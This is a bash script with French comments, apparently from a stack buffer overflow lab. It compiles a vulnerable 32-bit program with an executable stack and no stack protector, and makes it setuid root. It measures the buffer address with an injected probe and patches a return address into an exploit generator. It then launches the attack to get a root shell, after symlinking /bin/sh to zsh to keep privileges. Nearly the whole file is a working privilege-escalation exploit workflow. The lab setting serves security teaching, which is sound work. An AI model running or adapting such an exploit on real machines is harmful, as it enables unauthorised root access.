#!/bin/bash
# T3 Niveau 1 - auto-calibration par SONDE REELLE (pas gdb : gdb modifie
# argv[0]/l'environnement et fausse l'adresse mesuree par rapport a une
# execution directe, comme on l'a vu ce soir).
source "$(dirname "$0")/00_config.sh" || exit 1
sudo ln -sf /bin/zsh /bin/sh      # IMPORTANT : pas dash/bash ici, sinon le
                                  # privilege tombe meme avec le bon ret
cd "$E3" || exit 1

echo "=== Mesure reelle de &buffer (sonde temporaire) ==="
cp stack.c stack_probe_tmp.c
sed -i '/char buffer\[BUF_SIZE\];/a\    printf("PROBE &buffer = %p\\n", (void*)buffer); fflush(stdout);' stack_probe_tmp.c
gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack-L1 stack_probe_tmp.c
touch badfile
PROBE_OUT=$(timeout 2 ./stack-L1 2>&1)
BUF_HEX=$(echo "$PROBE_OUT" | grep -oE '0x[0-9a-fA-F]+' | tail -1)
rm -f stack_probe_tmp.c
echo "&buffer mesure = $BUF_HEX"

if [ -z "$BUF_HEX" ]; then
  echo "ERREUR : sonde n'a rien mesure. Verifiez que badfile existe et stack.c est intact."
  exit 1
fi

RET_HEX=$(python3 -c "print(hex($BUF_HEX + 300))")
echo "ret calcule = $RET_HEX (offset=112, sled avant start=400)"

echo "=== Reconstruction du binaire PROPRE (sans sonde) + setuid root ==="
gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack-L1 stack.c
sudo chown root stack-L1
sudo chmod 4755 stack-L1

echo "=== Mise a jour d'exploit_L1.py avec le ret mesure ==="
sed -i -E "s/^ret[[:space:]]*=.*/ret    = $RET_HEX/" exploit_L1.py
grep -n "^ret\|^offset\|^start" exploit_L1.py

echo "=== Generation du badfile + attaque ==="
python3 exploit_L1.py
./stack-L1
id
cat /proc/self/status | grep -E "^Uid|^Gid"
exit
